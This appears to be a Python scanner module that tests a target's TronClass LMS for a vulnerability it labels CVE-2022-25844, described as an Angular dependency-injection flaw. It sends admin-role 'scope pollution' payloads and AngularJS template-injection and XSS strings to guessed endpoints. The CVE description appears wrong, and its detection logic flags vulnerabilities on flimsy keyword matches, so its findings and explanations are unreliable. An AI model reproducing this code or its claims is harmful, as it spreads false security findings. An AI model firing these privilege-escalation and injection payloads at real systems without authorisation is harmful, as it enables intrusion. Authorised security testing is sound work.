"""
CVE-2022-25844 Vulnerability Detection Script
Angular dependency injection vulnerability detection for TronClass LMS
"""

import requests
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2022-25844 vulnerability
    Angular dependency injection and service vulnerability
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2022-25844: Angular 相依性注入服務弱點，可能導致未授權存取內部服務',
        'remediation': '更新 Angular 到最新版本，實施適當的服務隔離，限制服務存取權限，使用白名單機制'
    }
    
    try:
        # Step 1: 檢測 Angular 應用程式
        print(f"      [檢測] 正在檢查目標是否使用 Angular 框架...")
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            '@angular/core',
            '@angular/common',
            'ng-app',
            'ng-controller',
            'ng-service',
            'angular.module',
            'angular.service',
            'angular.factory',
            'angular.provider',
            'angular.injector'
        ]
        
        detected_indicators = [indicator for indicator in angular_indicators if indicator in response.text.lower()]
        
        if not detected_indicators:
            result['evidence'] = "未檢測到 Angular 應用程式，跳過此弱點檢測"
            return result
        
        print(f"      [檢測] 發現 Angular 相關指標: {', '.join(detected_indicators[:3])}")
        
        # Step 2: 檢查是否有明顯的 Angular 服務暴露
        service_exposure_found = False
        for indicator in ['angular.module', 'angular.service', 'angular.factory']:
            if indicator in response.text:
                service_exposure_found = True
                print(f"      [檢測] 發現可能的服務暴露: {indicator}")
                break
        
        if not service_exposure_found:
            result['evidence'] = "檢測到 Angular 但未發現明顯的服務暴露問題"
            return result
        
        # Step 3: 測試 Angular 依賴注入弱點
        print(f"      [檢測] 開始測試 Angular 依賴注入弱點...")
        
        # Common Angular service endpoints to test
        test_endpoints = [
            '/api/service',
            '/api/inject',
            '/api/dependency',
            '/service/test',
            '/inject/test',
            '/dependency/test',
            '/api/angular',
            '/angular/service',
            '/api/v1/service',
            '/v1/inject'
        ]
        
        # Test payloads for dependency injection
        di_payloads = [
            {'service': 'HttpClient'},
            {'service': '$http'},
            {'service': '$rootScope'},
            {'service': '$compile'},
            {'service': '$eval'},
            {'service': '$parse'},
            {'service': '$interpolate'},
            {'service': '$sce'},
            {'service': '$sanitize'},
            {'service': 'DocumentRef'},
            {'service': 'WindowRef'},
            {'service': 'Location'},
            {'service': 'Router'},
            {'service': 'ActivatedRoute'}
        ]
        
        vulnerable_endpoints = []
        
        for endpoint in test_endpoints:
            try:
                # Test if endpoint exists first
                test_response = session.get(urljoin(target_url, endpoint), timeout=30)
                if test_response.status_code == 404:
                    continue
                    
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload in di_payloads:
                    try:
                        headers = {'Content-Type': 'application/json'}
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=payload,
                            headers=headers,
                            timeout=30
                        )
                        
                        # Check for successful dependency injection indicators
                        if response.status_code == 200:
                            service_indicators = ['injected', 'service', 'dependency', 'provider', 'angular', 'module']
                            response_text = response.text.lower()
                            
                            found_indicators = [indicator for indicator in service_indicators if indicator in response_text]
                            
                            if found_indicators:
                                print(f"      [檢測] 在 {endpoint} 發現可疑回應，包含關鍵字: {', '.join(found_indicators)}")
                                vulnerable_endpoints.append({
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'indicators': found_indicators,
                                    'response_length': len(response.text)
                                })
                                
                                # Check if response contains actual service data
                                if len(response.text) > 100 and any(keyword in response_text for keyword in ['function', 'object', 'prototype']):
                                    result['vulnerable'] = True
                                    result['evidence'] = f"在端點 {endpoint} 發現 Angular 依賴注入弱點。系統回應了服務請求 {payload}，返回了 {len(response.text)} 字節的資料，包含關鍵指標: {', '.join(found_indicators)}。這表明攻擊者可能能夠存取內部 Angular 服務。"
                                    return result
                                    
                    except:
                        continue
                        
            except:
                continue
        
        # If we found suspicious endpoints but no clear vulnerability
        if vulnerable_endpoints:
            result['evidence'] = f"發現 {len(vulnerable_endpoints)} 個可疑端點回應了依賴注入請求，但未確認為明確弱點。建議進一步手動檢查。"
        else:
            result['evidence'] = "未發現 Angular 依賴注入弱點的明確證據。"
        
        # Step 4: 測試 Angular 服務污染攻擊
        print(f"      [檢測] 測試 Angular 服務污染攻擊...")
        
        service_pollution_payloads = [
            {'$rootScope': {'admin': True}},
            {'$scope': {'isAdmin': True}},
            {'$rootScope': {'role': 'admin'}},
            {'$scope': {'authenticated': True}},
            {'$rootScope': {'permissions': ['admin']}},
            {'$scope': {'user': {'role': 'admin'}}},
            {'$rootScope': {'config': {'admin': True}}},
            {'$scope': {'settings': {'isAdmin': True}}}
        ]
        
        pollution_attempts = 0
        for endpoint in test_endpoints:
            for payload in service_pollution_payloads:
                try:
                    pollution_attempts += 1
                    headers = {'Content-Type': 'application/json'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        # Check for successful pollution by testing user endpoint
                        test_response = session.get(urljoin(target_url, '/api/user'), timeout=30)
                        
                        if 'admin' in test_response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 Angular 服務污染弱點。注入負載 {payload} 後，系統在 /api/user 端點返回了包含 'admin' 的回應，表明服務作用域被成功污染。進行了 {pollution_attempts} 次污染嘗試。"
                            return result
                            
                except:
                    continue
        
        print(f"      [檢測] 完成 {pollution_attempts} 次服務污染測試，未發現明確弱點")
        
        # Step 5: 測試 Angular 提供者弱點
        print(f"      [檢測] 測試 Angular 提供者(Provider)弱點...")
        
        provider_payloads = [
            {'provider': '$compile', 'template': '{{constructor.constructor("alert(1)")()}}'},
            {'provider': '$interpolate', 'expression': '{{7*7}}'},
            {'provider': '$parse', 'expression': 'constructor.constructor("alert(1)")()'},
            {'provider': '$eval', 'expression': 'alert(1)'},
            {'provider': '$sce', 'html': '<script>alert(1)</script>'},
            {'provider': '$sanitize', 'html': '<script>alert(1)</script>'}
        ]
        
        provider_tests = 0
        for endpoint in test_endpoints:
            for payload in provider_payloads:
                try:
                    provider_tests += 1
                    headers = {'Content-Type': 'application/json'}
                    response = session.post(
                        urljoin(target_url, endpoint),
                        json=payload,
                        headers=headers,
                        timeout=30
                    )
                    
                    # Check for template injection execution
                    if '49' in response.text and '{{7*7}}' in str(payload):
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現 Angular 提供者範本注入弱點。負載 {payload} 被執行，運算結果 '49' 出現在回應中，表明系統允許任意程式碼執行。共進行了 {provider_tests} 次提供者測試。"
                        return result
                    
                    if response.status_code == 200 and str(payload) in response.text:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現 Angular 提供者弱點。系統回應了完整的負載內容 {payload}，表明注入的提供者被處理。共進行了 {provider_tests} 次提供者測試。"
                        return result
                        
                except:
                    continue
        
        print(f"      [檢測] 完成 {provider_tests} 次提供者測試，未發現明確弱點")
        
        # Step 6: 最終檢測結果總結
        print(f"      [檢測] 完成 Angular 依賴注入弱點掃描")
        
        # If no vulnerabilities found, provide comprehensive evidence
        if not result['vulnerable']:
            total_tests = pollution_attempts + provider_tests
            result['evidence'] = f"完成了完整的 Angular 依賴注入弱點掃描。檢測到 Angular 框架使用指標: {', '.join(detected_indicators[:3])}。共測試了 {len(test_endpoints)} 個端點，進行了 {total_tests} 次各類攻擊測試，包括依賴注入、服務污染、提供者弱點測試，均未發現明確的安全弱點。系統對於 Angular 依賴注入攻擊具有一定的防護能力。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result